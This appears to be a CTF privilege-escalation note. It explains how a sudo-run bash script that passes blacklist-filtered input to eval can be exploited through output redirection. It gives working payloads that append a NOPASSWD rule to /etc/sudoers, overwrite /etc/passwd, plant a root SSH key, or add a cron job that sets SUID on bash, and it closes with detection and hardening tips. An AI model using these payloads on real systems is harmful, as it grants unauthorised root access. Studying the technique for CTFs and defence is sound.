# Bash `eval` Filter Bypass (Redirection → sudoers)

Used on: **Yueiua**

A sudo-allowed bash script pipes user input through a character blacklist and then calls `eval "echo $input"`. The blacklist covers command-substitution metacharacters (`` ` ``, `$(`, `|`, `&`, `;`) but **leaves `>` redirection untouched**. Because `eval` runs under the sudo-elevated shell, any output can be redirected to a root-owned file — typically `/etc/sudoers`.

## Prerequisites
- `sudo -l` allows the script without a password.
- The script ultimately calls `eval`, `bash -c`, `sh -c`, or similar on attacker-controlled data.
- The filter does NOT block `>` / `>>`.

## Vulnerable Pattern

```bash
#!/bin/bash
read feedback
if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* \
    && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* \
    && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    eval "echo $feedback"    # <-- redirection metacharacters still win
fi
```
Blacklisted: `` ` ``, `)`, `$(`, `|`, `&`, `;`, `?`, `!`, `\`.
**Missing**: `>`, `<`, `>>`, `(` (alone), `$VAR`, globs.

## Steps

### 1. Confirm the path
```bash
sudo -l
# (ALL) /opt/NewComponent/feedback.sh
cat /opt/NewComponent/feedback.sh
```

### 2. Payload — append to sudoers
```bash
sudo /opt/NewComponent/feedback.sh
# Enter your feedback:
deku ALL=NOPASSWD: ALL >> /etc/sudoers
```
`eval "echo deku ALL=NOPASSWD: ALL >> /etc/sudoers"` runs — the shell expands `>>` and appends the literal text to `/etc/sudoers` as root.

### 3. Cash in
```bash
sudo -l              # deku is now NOPASSWD ALL
sudo su -            # root
```

## Other Redirection-Only Payloads

| Goal | Payload |
|------|---------|
| Overwrite `/etc/passwd` with a root-like line | `root2:$6$salt$hash:0:0::/root:/bin/bash > /etc/passwd` (use `>>`) |
| Drop an SSH key for root | `ssh-ed25519 AAA… attacker > /root/.ssh/authorized_keys` |
| Write a script into `/etc/cron.d/` | `* * * * * root /bin/bash -c 'chmod u+s /bin/bash' > /etc/cron.d/x` |
| Clobber a cron helper called by root | `chmod u+s /bin/bash > /path/to/cron_helper.sh` |

Anywhere root writes periodically is fair game.

## Why the Blacklist Fails

- `eval` re-parses its argument under the shell, so `>`, `>>`, `<`, `<(...)` (note: `(` may be blocked but alone it isn't always caught) all get expanded.
- Redirection does not need `$`, `` ` ``, or any substitution — the blacklist never considers it.
- Tokenization: `echo $feedback` becomes `echo foo >> /etc/sudoers` — `echo foo` runs, its stdout is redirected.

## Detection / Hardening

```bash
grep -Rn 'eval\|sh -c\|bash -c' /opt /home /usr/local/bin 2>/dev/null
```

Fix patterns:
- Never `eval` on user input. Quote every variable.
- Use `declare -- "input=$input"` and printf instead of echo.
- Enforce an allowlist (`[[ "$input" =~ ^[A-Za-z0-9\ ]+$ ]]`) rather than a blacklist.

## Related
- [sudo-input-injection.md](sudo-input-injection.md) — direct `read` → unquoted exec (Team)
- [sudo-script-helper-hijack.md](sudo-script-helper-hijack.md) — sudo script calls writable helper (LazyAdmin)
- [sudo-bash-overwrite.md](sudo-bash-overwrite.md) — sudo + `bash` → SUID bash (DevArea)


